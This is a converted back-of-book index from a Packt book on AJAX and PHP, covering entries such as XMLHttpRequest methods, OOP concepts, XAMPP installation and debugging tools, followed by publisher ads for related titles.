Larger Text,Smaller Text,Symbol
G,"getAllResponseHeaders() method, 
  
   
 XMLHttpRequest  60 
  
 getCellCount() method  99 
  
 GetCurrentHour() function  90 
  
 getElementByID function 
  
  
 using  53 
  
 GETmethod  62 
  
 getResponseHeader() method, 
  
   
 XMLHttpRequest  60 
  
 Gmail!  15 
  
 Google 
  
  
 about  15 
  
  
 autocompletion feature, displaying  16 
 Google Maps  15 
  
 graceful degradation technique  207
  
 handleServerResponse() method  29, 32, 
 33, 
  
 76, 77, 132 
  
 heartbeat pattern  202 
  
 Hotmail  15 
  
 HTML  10 
  
 HTML message pattern  202 
  
 HTTP  10 
  
 HttpOnly cookie flag  222",NA
I,"IM  223 
  
 inheritance, OOP 
  
  
 about  84 
  
  
 base class  84 
  
  
 derived class  84 
  
  
 new class, creating  84 
  
  
 tight coupling  84 
  
 innerHTML property, DOM
   45 
 installing 
  
  
 XAMPP  280-283 
  
  
 XAMPP, on Linux  283 
  
  
 XAMPP, on Windows  280-283 
 Internet Explorer 
  
  
 debugging  184 
  
  
 Developer Toolbar  193 
  
  
 Firebug Lite  193 
  
  
 Internet Explorer 8  186 
  
  
 other debugging tools  193 
  
  
 profiling  184 
  
  
 Visual Web Developer  194 
  
  
 Web Development Helper  194 
 Internet Explorer 6 
  
  
 debug, enabling  184-186 
  
 Internet Explorer 7 
  
  
 debug, enabling  184-186 
  
 Internet Explorer 8 
  
  
 debugging  186-193 
  
  
 Developer Tools  186 
  
 IRC  223 
  
 isDatabaseCleared() method  
 256",NA
J,NA,NA
H ,"handleRequestStateChange() method  63, 70
  
 Java applets  13 
  
 JavaScript 
  
  
 about  12
  
 [
  290 
 ]",NA
K,"key/value collections 
 See
  dictionaries",NA
M,"Macromedia Flash  13 
  
 Meebo 
  
  
 about  224 
  
  
 feature  224 
  
 method chaining, jQuery  227 
  
 Microsoft Silverlight  13 
  
 MySQL 
  
  
 connecting, to database  139 
  
  
 databases tables, working with  135 
  
 data, manipulating  137 
  
  
 working with  134",NA
N,NOT NULL property  136,NA
O,"ob_clean() function  131 
  
 object detection, JavaScript  58 
  
 Object Oriented. 
 See
   OO 
  
 Object-Oriented Programming. 
 See
   OOP 
 On-Demand JavaScript pattern  202 
  
 onload event  45 
  
 onreadystatechange() property, 
  
   
 XMLHttpRequest  60, 61 
  
 OO  82 
  
 OOP 
  
  
 about  36, 82
  
 [
  291 
 ]",NA
P,"page reload  14 
  
 page updates pattern  203 
  
 parent. 
 See
   base class 
  
 passing parameters, PHP 
  
  
 about  123 
  
  
 steps  124, 126, 128 
  
 performance analysis  183 
  
 periodic refresh pattern  202 
  
 PHP 
  
  
 _ _construct() method  180 
  
  
 __destruct() method  180 
  
  
 about  11 
  
  
 connecting, to database  139 
  
  
 MySQL, working with  134 
  
  
 page request  12 
  
  
 passing parameters  123 
  
  
 server-side uses  36, 114 
  
 phpMyAdmin 
  
  
 using  279 
  
 Picasa Web Albums  15 
  
 placeholders  41 
  
 polymorphism, OOP  85 
  
 popup pattern  203 
  
 POST method  62 
  
 predictive fetching pattern  202, 204 
 private members  84 
  
 process() method 
  
  
 about  31, 33, 69 
  
  
 using  45 
  
 profiling  183 
  
 programming concepts, OOP 
  
  
 behavior  82 
  
  
 class  82 
  
  
 encapsulation  83 
  
  
 events  82
  
  
 fields  82 
  
  
 inheritance  84 
  
  
 methods  82 
  
  
 polymorphism  85 
  
  
 propertie  82 
  
  
 state  82 
  
  
 type  82 
  
 progress indicator pattern  202-205 
  
 progressive enhancement pattern  203, 
 207 prototypes  86 
  
 Prototyping language  98 
  
 public interface  83",NA
Q,"quickstart application, AJAX 
  
 building  20-31 
  
 index.html file  22 
  
 quickstart.js file  22, 23, 25 
  
 quickstart.php file  22, 26",NA
R,"RDBMS  134 
  
 readyState() method, XMLHttpRequest  61 
 Relational Database Management System. 
  
  
 See
   RDBMS 
  
 responseText() method, XMLHttpRequest 
  
 61 
  
 responseXML() method, XMLHttpRequest 
  
 61 
  
 retrieveNewMessages() method  252, 257",NA
S,"saveXML function  119 
  
 security vulnerabilities, XSS 
  
  
 cookies scenarios  222 
  
  
 escaping  221 
  
  
 input validation  221 
  
 sendMessage function  255 
  
 send() method, XMLHttpRequest  60 
 server response 
  
  
 asynchronous calls, making with 
  
  
 XMLHttpRequest  65-70 
  
 setRequestHeader() method, 
  
   
 XMLHttpRequest  60
  
 [
  292 
 ]",NA
T,"tight coupling  84 
  
 timeout pattern  203 
  
 turn() method  83 
  
 type. 
 See
   class",NA
U,"UML  95 
  
 Unified Modeling Langugae. 
 See
   UML 
 unique URLs pattern  203 
  
 unobtrusive JavaScript pattern  205, 
 206",NA
V,"validate.class.php 
  
  
 validateAJAX() method  180 
  
  
 validatePHP() method  180 
  
 validation 
  
  
 about  145 
  
  
 AJAX form validation   146 
  
  
 data  145 
  
  
 server-side form validation   146 
 Venkman JavaScript debugger 
  
 about  197 
  
  
 handleRequestStateChange()  198 
  
 in action  198 
  
 virtual workspace pattern  203 
  
 Visual Web Developer  194",NA
W,"Web 2.0 
  
  
 and AJAX  9 
  
 Web Developer 
  
  
 about  199 
  
  
 activities  199 
  
 Web Development Helper  194 
 websites 
  
  
 about  10 
  
  
 building  10 
  
 websites, building 
  
  
 client-side technologies  11 
  
  
 HHTP  10 
  
  
 HTML  10 
  
  
 PHP  11 
  
  
 server-side technologies  11",NA
X,"XAMPP 
  
  
 installing  280 
  
  
 installing, on Linux  283 
  
  
 installing, on Windows  280-283 
  
  
 XAMPPusing  280 
  
 XAMPP installation 
  
  
 on Linux  283 
  
  
 on Windows  280-283 
  
  
 phpMyAdmin installation, testing  282, 283 
 XML  35 
  
 XmlHttp object 
  
  
 async.txt  156 
  
  
 properties  157 
  
  
 readResponse() inner function  158 
  
  
 readystatechange event  158 
  
  
 xhr.js file  151-154 
  
  
 xhrtest.html file  155 
  
  
 XmlHttp()  156 
  
  
 XmlHttp.create()  156 
  
 XMLHttpRequest 
  
  
 about  150 
  
  
 complete  150 
  
  
 settings class  150 
  
  
 XmlHttp object  151
  
 [
  293 
 ]",NA
Y,"Yahoo!  15 
  
 Yahoo! Mail  15 
  
 Yahoo! Maps  15 
  
 Yahoo User Interface Library. 
 See
   YUI 
 YUI  82
  
 [
  294 
 ]",NA
Thank you for buying ,NA,NA
AJAX and PHP,NA,NA
Writing for Packt,"We welcome all inquiries from people who are interested in authoring. Book proposals should be 
 sent to 
 author@packtpub.com
 . If your book idea is still at an early stage and you would like to 
 discuss it first before writing a formal book proposal, contact us; one of our commissioning 
 editors will get in touch with you. 
  
 We're not just looking for published authors; if you have strong technical skills but no writing 
 experience, our experienced editors can help you develop a writing career, or simply get some 
 additional reward for your expertise.",NA
About Packt Publishing,"Packt, pronounced 'packed', published its first book ""Mastering phpMyAdmin for Effective 
 MySQL Management"" in April 2004 and subsequently continued to specialize in publishing 
 highly focused books on specific technologies and solutions. 
  
 Our books and publications share the experiences of your fellow IT professionals in adapting and 
 customizing today's systems, applications, and frameworks. Our solution-based books give you the 
 knowledge and power to customize the software and technologies you're using to get the job done. 
 Packt books are more specific and less general than the IT books you have seen in the past. Our 
 unique business model allows us to bring you more focused information, giving you more of what 
 you need to know, and less of what you don't.
  
 Packt is a modern, yet unique publishing company, which focuses on producing quality, 
 cutting-edge books for communities of developers, administrators, and newbies alike. For 
 more information, please visit our website: 
 www.PacktPub.com
 .",NA
PHP and script.aculo.us Web 2.0 ,NA,NA
Application Interfaces ,"ISBN: 978-1-847194-04-6             Paperback: 264 pages
  
 Build powerful interactive AJAX applications with 
 script.aculo.us and PHP 
  
 1. 
  
 2. 
  
 3. 
  
 Get started quickly with script.aculo.us library 
 with as little as one line of code 
  
 Explore Prototype library features, tutorials, 
 code, and examples 
  
 Learn script.aculo.us' In-place Editing, Auto 
 Completion, Sliders, Drag-and-Drop, Effects, 
  
 and Multimedia",NA
DWR Java AJAX Applications ,"ISBN: 978-1-847192-93-6            Paperback: 228 pages
  
 A step-by-step example-packed guide to learning 
 professional application development with Direct 
 Web Remoting 
  
 1. 
  
 2. 
  
 3. 
  
 Learn Direct Web Remoting features from 
 scratch and how to apply DWR practically
  
 Topics such as configuration, testing, and 
 debugging are thoroughly explained 
 through examples 
  
 Demonstrates advanced elements of creating 
 user interfaces and back-end integration 
  
  
 Please check 
 www.PacktPub.com
  for information on our titles",NA
Microsoft AJAX Library ,NA,NA
Essentials: Client-side ASP.NET ,NA,NA
AJAX 1.0 Explained ,"ISBN: 978-1-847190-98-7            Paperback: 300 pages
  
 A practical tutorial to enhancing the user experience of 
 your ASP.NET web applications with the final release of 
 the Microsoft AJAX Library 
  
 1. 
  
 2. 
  
 3. 
  
 A rapid and practical guide to including AJAX 
 features in your .NET applications
  
 Learn practical development strategies 
 and techniques
  
 Go through a case study that demonstrates the 
 theory you learned throughout the book.",NA
Learning PHP Data Objects ,"ISBN: 978-1-847192-66-0            Paperback: 188 pages
  
 A Beginner's Guide to PHP Data Objects, Database 
  
 Connection Abstraction Library for PHP 5 
  
 1. 
  
 An overview of PDO
  
 2. 
  
 Creating a database and connecting to it
  
 3. 
  
 Error Handling
  
 3. 
  
 Advanced features
  
 Please check 
 www.PacktPub.com
  for information on our titles",NA
